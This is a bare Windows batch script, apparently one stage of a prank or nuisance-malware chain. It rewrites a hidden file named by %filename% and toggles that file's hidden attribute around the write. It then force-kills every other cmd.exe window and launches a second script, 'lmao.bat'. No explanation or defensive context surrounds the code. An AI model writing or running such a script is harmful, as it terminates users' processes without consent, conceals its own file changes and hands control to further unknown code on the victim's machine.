title idkhelp
attrib -h %filename%
echo initcopy >%filename%
attrib +h %filename%
taskkill /f /fi "windowtitle ne idkhelp*" /im cmd.exe
start lmao.bat
exit
